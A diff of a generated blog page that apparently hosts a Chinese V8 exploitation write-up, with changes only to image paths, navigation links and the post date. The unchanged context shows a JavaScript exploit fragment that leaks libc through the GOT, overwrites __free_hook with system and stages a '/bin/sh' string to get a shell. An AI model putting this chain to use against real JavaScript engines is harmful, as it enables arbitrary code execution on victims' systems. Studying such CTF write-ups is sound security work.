@@ -152,8 +152,8 @@ var _hmt = _hmt || [];
 <p>包括最后的利用也是一样的，唯一不一样的是text地址的偏移变了，这个自己重新算算就ok了：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> text_addr = (read64(read64(a_constructor_addr + <span class="number">0x30n</span>)<span class="number">-1n</span> +<span class="number">0x40n</span>) &gt;&gt; <span class="number">16n</span>) - <span class="number">0xaf6c60n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] text addr: "</span> + hex(text_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sprintf_got = text_addr+<span class="number">0xdbe770n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] sprintf got addr: "</span> + hex(sprintf_got));</span><br><span class="line"><span class="keyword">var</span> libc_addr = read64(sprintf_got) - <span class="number">0x65000n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] libc addr: "</span> + hex(libc_addr));</span><br><span class="line"><span class="keyword">var</span> system_addr = libc_addr + <span class="number">0x4f440n</span>;</span><br><span class="line"><span class="keyword">var</span> free_hook_addr = libc_addr + <span class="number">0x3ed8e8n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] system addr: "</span> + hex(system_addr));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] free hook addr: "</span> + hex(free_hook_addr));</span><br><span class="line"></span><br><span class="line">dataview_write(free_hook_addr,system_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> get_shell_buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">let</span> get_shell_dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(get_shell_buffer);</span><br><span class="line">get_shell_dataview.setFloat64(<span class="number">0</span>, i2f(<span class="number">0x0068732f6e69622fn</span>), <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/06/01/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E2222/image-20200607193933641.png" alt="image-20200607193933641"></p>
-<p><img src="/2020/06/01/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E2222/image-20200607193953159.png" alt="image-20200607193953159"></p>
+<p><img src="/2020/06/07/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E/image-20200607193933641.png" alt="image-20200607193933641"></p>
+<p><img src="/2020/06/07/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E/image-20200607193953159.png" alt="image-20200607193953159"></p>
 <h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>如有错误欢迎指正：<a href="mailto:sofr@foxmail.com">sofr@foxmail.com</a></p>
 <p>之前文章：</p>
 <p>v8开坑+starCTF2019 oob：[<a href="http://pwn.sofr.website/2020/06/01/v8%E5%BC%80%E5%9D%91/]" target="_blank" rel="noopener">http://pwn.sofr.website/2020/06/01/v8%E5%BC%80%E5%9D%91/]</a>(</p>
@@ -166,13 +166,12 @@ var _hmt = _hmt || [];
 
     
     
-    <a href="/2020/06/01/v8开坑/" type="button" class="btn btn-default"><i
-                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
     
 
     <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
     
-    <a href="/2020/05/11/de1-wp/" type="button" class="btn btn-default ">Next<i
+    <a href="/2020/06/01/v8开坑/" type="button" class="btn btn-default ">Next<i
                 class="fa fa-arrow-circle-o-right"></i></a>
     
 
@@ -201,7 +200,7 @@ var _hmt = _hmt || [];
 	
 	<div class="meta-widget">
 	<i class="fa fa-clock-o"></i>
-	2020-06-01 
+	2020-06-07 
 	</div>
 	
 
